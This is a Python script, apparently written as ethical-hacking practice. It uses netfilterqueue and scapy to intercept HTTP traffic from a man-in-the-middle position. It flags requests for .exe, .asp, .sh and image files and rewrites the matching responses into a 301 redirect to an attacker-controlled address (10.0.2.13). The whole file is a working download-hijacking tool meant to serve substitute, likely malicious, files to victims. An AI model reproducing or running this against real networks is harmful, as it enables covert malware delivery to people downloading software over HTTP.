from netfilterqueue import NetfilterQueue
import scapy.all as scapy
#tested at the link below
# http://www.speedbit.com/
#this project works for http protocol only
ack_dict = {}
extension_list = [".exe",".asp",".PNG",".JPEG",".sh"]
#check if a packet is a request
def is_request(scapy_packet):
	if scapy_packet.haslayer(scapy.TCP):
		return scapy_packet[scapy.TCP].dport == 80
	else:
		return False
#check if a packet is response
def is_response(scapy_packet):
	if scapy_packet.haslayer(scapy.TCP):
		return scapy_packet[scapy.TCP].sport == 80
	else:
		return False

#iterating through number of intersting extensions
#if the extension is found in the load of a request packet
#the ack field in the tcp of this request is saved to get it's corresponding sequence
def process_request(scapy_packet):
	for extension in extension_list:
		if extension in str(scapy_packet[scapy.Raw].load):
			print("[+] HTTP request contains interesting [exe/asp/png/jpeg/sh] extension is captured\n")
			ack_dict[str(scapy_packet[scapy.TCP].ack)] = "True"

#forgery of the response takes place here
#if the incoming response is saved in dictionary before
#then it is a response for a known request which is an interesting one 
#loading the new load && deleting chksum/len fields to be re-caulculated by scapy 
#if the incoming response isn't saved before then it is neglected
def process_response(scapy_packet,load):
	if str(scapy_packet[scapy.TCP].seq) in ack_dict:
		print("[+] HTTP response to the interesting request is forged :-)\n")
		del ack_dict[str(scapy_packet[scapy.TCP].seq)]
		#forging a packet
		scapy_packet[scapy.Raw].load = load
		del scapy_packet[scapy.TCP].chksum 
		del scapy_packet[scapy.IP].len
		del scapy_packet[scapy.IP].chksum
		return scapy_packet
	else: 
		return None

#for every packet in the NetFilter Queue it is processed 
#if it is a request then process_request handles it
#if it is a response then process_response handles it
#finally packets are forwarded through it
def inject_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw) :
		if is_request(scapy_packet) :
			process_request(scapy_packet)			
						
		elif is_response(scapy_packet):
			scapy_packet = process_response(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.13/\n")
			if scapy_packet:
				packet.set_payload(bytes(scapy_packet))
				 
			
	#forwarding the packet once more
	packet.accept()
	
#defining main netfilter functions and variables



def start_up(queue_num):
	nfqueue = NetfilterQueue()
	nfqueue.bind(queue_num, inject_packet)
	try:
		print("[+] waiting for data ....")
		nfqueue.run()
	except KeyboardInterrupt:
		print("\n[-] Going to sleep .....")
start_up(0)
